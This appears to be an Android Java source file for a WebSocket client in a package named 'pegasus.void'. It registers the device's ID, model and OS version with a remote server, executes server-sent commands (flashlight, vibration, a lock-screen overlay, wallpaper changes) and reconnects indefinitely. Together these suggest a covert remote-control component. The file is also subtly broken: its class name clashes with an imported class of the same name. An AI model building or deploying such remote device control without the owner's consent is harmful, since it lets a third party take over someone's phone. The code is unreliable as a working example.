package com.pegasus.void;

import android.os.Build;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;

import java.net.URI;

public class WebSocketClient {

    private static final String TAG = "WebSocketClient";
    private org.java_websocket.client.WebSocketClient client;
    private DeviceController deviceController;
    private String serverUrl;

    public WebSocketClient(String serverUrl, DeviceController controller) {
        this.serverUrl = serverUrl;
        this.deviceController = controller;
    }

    public void connect() {
        try {
            URI uri = new URI(serverUrl);
            
            client = new org.java_websocket.client.WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    Log.d(TAG, "Connected to server");
                    sendDeviceInfo();
                }

                @Override
                public void onMessage(String message) {
                    Log.d(TAG, "Received: " + message);
                    handleCommand(message);
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    Log.d(TAG, "Connection closed");
                    reconnect();
                }

                @Override
                public void onError(Exception ex) {
                    Log.e(TAG, "Error: " + ex.getMessage());
                    reconnect();
                }
            };
            
            client.connect();
        } catch (Exception e) {
            Log.e(TAG, "Connection error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("type", "register");
            deviceInfo.put("deviceId", Build.ID);
            deviceInfo.put("deviceModel", Build.MODEL);
            deviceInfo.put("androidVersion", Build.VERSION.RELEASE);
            
            if (client != null && client.isOpen()) {
                client.send(deviceInfo.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info: " + e.getMessage());
        }
    }

    private void handleCommand(String message) {
        try {
            JSONObject json = new JSONObject(message);
            String command = json.getString("command");

            switch (command) {
                case "flashlight_on":
                    deviceController.toggleFlashlight(true);
                    break;
                case "flashlight_off":
                    deviceController.toggleFlashlight(false);
                    break;
                case "vibrate":
                    int duration = json.optInt("duration", 500);
                    deviceController.vibrate(duration);
                    break;
                case "lock_screen":
                    deviceController.showLockOverlay();
                    break;
                case "unlock_screen":
                    deviceController.hideLockOverlay();
                    break;
                case "change_wallpaper":
                    String imageUrl = json.optString("imageUrl", "");
                    deviceController.changeWallpaper(imageUrl);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling command: " + e.getMessage());
        }
    }

    private void reconnect() {
        new Thread(() -> {
            try {
                Thread.sleep(5000);
                connect();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void disconnect() {
        if (client != null) {
            client.close();
        }
    }
}
